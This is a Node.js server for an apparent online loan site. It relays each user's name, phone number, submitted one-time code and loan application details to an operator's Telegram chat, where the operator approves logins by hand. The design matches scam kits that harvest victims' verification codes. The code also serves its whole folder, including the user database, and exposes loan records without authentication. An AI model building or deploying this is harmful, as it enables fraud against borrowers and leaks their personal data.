const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');

// ====== CONFIG ======
// These will be read from Render's Environment Variables.
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;

// Safety check: If variables are missing, stop the server so we can see the error clearly
if (!TELEGRAM_TOKEN || !ADMIN_CHAT_ID) {
    console.error("❌ ERROR: Missing TELEGRAM_TOKEN or ADMIN_CHAT_ID in Render Environment Variables.");
    process.exit(1); 
}

const app = express();
app.use(cors());
app.use(bodyParser.json({ limit: '10mb' })); 
app.use(express.static(__dirname)); // Serves files directly from the main folder

const DB_PATH = path.join(__dirname, 'data', 'users.json');
if (!fs.existsSync(path.dirname(DB_PATH))) fs.mkdirSync(path.dirname(DB_PATH), { recursive: true });
if (!fs.existsSync(DB_PATH)) fs.writeFileSync(DB_PATH, JSON.stringify({ users: {}, otps: {}, applications: [], pendingVerifications: {} }, null, 2));

function loadDB() { return JSON.parse(fs.readFileSync(DB_PATH)); }
function saveDB(db) { fs.writeFileSync(DB_PATH, JSON.stringify(db, null, 2)); }

// Initialize Telegram Bot
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

// Handle Bot Polling Errors gracefully
bot.on('polling_error', (error) => {
    console.error("Telegram Bot Error:", error.message);
});

// User logs in with Name & Phone
app.post('/api/login', (req, res) => {
  const { phone, name } = req.body;
  if (!phone || phone.length < 9) return res.status(400).json({ error: 'Invalid phone' });
  const db = loadDB();
  
  if (!db.users[phone]) {
    db.users[phone] = { phone, name: name||'Customer', createdAt: Date.now(), loans: [], creditScore: 0, chatId: null };
  } else {
    db.users[phone].name = name; 
  }
  
  // Generate OTP
  const otp = Math.floor(100000 + Math.random()*900000).toString();
  db.otps[phone] = { otp, expires: Date.now()+10*60*1000 };
  saveDB(db);
  
  // Send OTP to Admin (Financier) on Telegram
  bot.sendMessage(ADMIN_CHAT_ID, `🔐 *NEW LOGIN ATTEMPT*\nName: ${name}\nPhone: ${phone}\n\nHere is the OTP to send to the user:\n👉 \`${otp}\`\n\n*(User is waiting on the OTP screen)*`, { parse_mode: 'Markdown' }).catch(()=>{});
  
  res.json({ ok: true });
});

// User submits OTP -> Sends Approve/Reject to Admin
app.post('/api/submit-otp', (req, res) => {
  const { phone, otp } = req.body;
  const db = loadDB();
  const rec = db.otps[phone];
  
  if (!rec || Date.now() > rec.expires) return res.status(400).json({ error: 'OTP expired. Go back and try again.' });
  
  const reqId = 'REQ-' + Date.now();
  db.pendingVerifications[phone] = { reqId, otpEntered: otp, status: 'waiting' };
  saveDB(db);

  const opts = {
    reply_markup: {
      inline_keyboard: [
        [
          { text: '✅ APPROVE', callback_data: `approve_${phone}` },
          { text: '❌ REJECT', callback_data: `reject_${phone}` }
        ]
      ]
    }
  };

  const isCorrect = String(rec.otp) === String(otp) ? "✅ Correct" : "❌ WRONG OTP ENTERED";

  bot.sendMessage(ADMIN_CHAT_ID, `🚨 *OTP VERIFICATION REQUEST*\nUser: ${db.users[phone].name}\nPhone: ${phone}\nExpected OTP: \`${rec.otp}\`\nUser Entered: \`${otp}\`\nStatus: ${isCorrect}`, { parse_mode: 'Markdown', ...opts });
  
  res.json({ ok: true, message: 'Waiting for admin approval' });
});

// Frontend checks if Admin clicked Approve/Reject
app.get('/api/check-approval/:phone', (req, res) => {
  const { phone } = req.params;
  const db = loadDB();
  const pending = db.pendingVerifications[phone];
  
  if (!pending) return res.json({ status: 'none' });
  
  if (pending.status === 'approved') {
    delete db.otps[phone]; 
    const user = db.users[phone];
    const paid = user.loans.filter(l=>l.status==='paid').length;
    const total = user.loans.length;
    user.creditScore = total===0 ? 0 : Math.min(100, Math.round((paid/total)*100));
    saveDB(db);
    
    return res.json({ status: 'approved', creditScore: user.creditScore, hasHistory: total>0, name: user.name });
  }
  
  if (pending.status === 'rejected') return res.json({ status: 'rejected' });
  
  res.json({ status: 'waiting' });
});

// Handle Telegram Button Clicks
bot.on('callback_query', (query) => {
  const data = query.data;
  const db = loadDB();

  if (data.startsWith('approve_')) {
    const phone = data.split('_')[1];
    if (db.pendingVerifications[phone]) {
      db.pendingVerifications[phone].status = 'approved';
      saveDB(db);
    }
    bot.editMessageText(`✅ APPROVED: User ${phone} can now proceed.`, { chat_id: query.message.chat.id, message_id: query.message.message_id });
    bot.answerCallbackQuery(query.id, { text: "User Approved!" });
  } 
  else if (data.startsWith('reject_')) {
    const phone = data.split('_')[1];
    if (db.pendingVerifications[phone]) {
      db.pendingVerifications[phone].status = 'rejected';
      saveDB(db);
    }
    bot.editMessageText(`❌ REJECTED: User ${phone} was denied.`, { chat_id: query.message.chat.id, message_id: query.message.message_id });
    bot.answerCallbackQuery(query.id, { text: "User Rejected!" });
  }
});

// View Loan Applications
bot.onText(/\/applications/, (msg) => {
  const db = loadDB();
  if (db.applications.length === 0) return bot.sendMessage(msg.chat.id, "No applications yet.");
  const latest = db.applications.slice(-3);
  latest.forEach(app => {
    bot.sendMessage(msg.chat.id, `📄 *New Application*\nName: ${app.fullName}\nPhone: ${app.fullPhone}\nAmount: $${app.amount}\nEmployment: ${app.employment}`);
  });
});

// Loan Application Submission
app.post('/api/apply-loan', (req, res) => {
  const data = req.body;
  const db = loadDB();
  
  const newApp = { id: 'APP-' + Date.now(), ...data, status: 'pending', date: new Date().toISOString() };
  db.applications.push(newApp);
  
  if (db.users[data.phone]) {
    db.users[data.phone].loans.push({ amount: data.amount, status: 'pending', date: newApp.date });
  }
  saveDB(db);

  bot.sendMessage(ADMIN_CHAT_ID, `🚨 *New Loan Application!*\nName: ${data.fullName}\nAmount: $${data.amount}\nPhone: ${data.fullPhone}\n(Check /applications)`).catch(()=>{});
  res.json({ ok: true });
});

// Get Loan History
app.get('/api/loans/:phone', (req, res) => {
  const db = loadDB();
  const u = db.users[req.params.phone];
  if (!u) return res.status(404).json({ error: 'User not found' });
  res.json({ loans: u.loans, creditScore: u.creditScore });
});

// Catch-all to serve index.html for any other route
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`✅ Server running on port ${PORT}. Bot is active.`));